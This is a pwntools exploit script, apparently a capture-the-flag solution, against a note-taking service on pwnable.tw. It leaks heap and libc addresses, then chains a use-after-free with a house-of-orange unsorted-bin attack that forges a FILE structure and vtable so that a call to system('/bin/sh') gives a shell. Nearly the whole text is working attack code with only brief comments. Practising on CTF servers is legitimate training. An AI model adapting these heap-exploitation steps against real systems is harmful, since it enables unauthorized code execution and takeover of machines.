from pwn import *

io = remote('chall.pwnable.tw', 10400)

def list_all():
    io.recvuntil('> ')
    io.sendline('list')

def note(cell, size, note):
    io.recvuntil('> ')
    io.sendline('note')
    io.recvuntil('Cell: ')
    io.sendline(str(cell))
    io.recvuntil('Size: ')
    io.sendline(str(size))
    if note:
        io.recvuntil('Note: ')
        io.send(note)

def punish(cell):
    io.recvuntil('> ')
    io.sendline('punish')
    io.recvuntil('Cell: ')
    io.sendline(str(cell))

def leak_heap():
    list_all()
    io.recvuntil('Sentence: Life imprisonment, multiple homicides\nNote: ')
    return io.recv(8)

def leak_libc():
    list_all()
    io.recvuntil('Sentence: Life imprisonment, psychopath, contract killer\nNote: ')
    return io.recv(8)

# leak heap address
note(0, 0x28, b'A')
note(1, 0x28, b'A')
note(0, 0xe8, b'A') # free 0
note(1, 0x38, b'A') # free 1
note(2, 0x28, b'0')
heap_leak = u64(leak_heap())
heap_base = heap_leak - 0x12430

# leak libc address
note(3, 0x88, b'A')
note(4, 0x48, b'A') # guardian
note(3, 0x98, b'A') # free 3
note(5, 0x88, b'\x78')
libc_leak = u64(leak_libc())
libc_base = libc_leak - 0x3c3b78

# use after free
payload = p64(heap_base) * 3 + p32(0) + p32(9) + p64(heap_base)
payload += p32(0x1000) + p32(0) + p64(heap_base + 0x12490) + p64(heap_base + 0x122f0)
punish(9)
note(9, 0x48, payload)

# house of orange
system_addr = libc_base + 0x45390
_IO_list_all_addr = libc_base + 0x3c4520
fake_vtable = heap_base + 0x124f0
fake_wide_data = heap_base + 0x12520

payload = b'/bin/sh\0' + p64(0x61) + p64(0) + p64(_IO_list_all_addr - 0x10)
payload += p64(0) * 11 + p64(system_addr) + p64(0) * 4 + p64(fake_wide_data) + p64(0x2) + p64(0x3)
payload += p64(0) + p64(0x1) + p64(0) * 2 + p64(fake_vtable)

note(0, 0xf8, b'A') # free and put chunk to unsorted bin
note(9, 0xe0, payload) # unsorted bin attack

# trigger malloc -> abort -> _IO_flush_all_lockp
note(6, 0x78, None)

io.interactive()
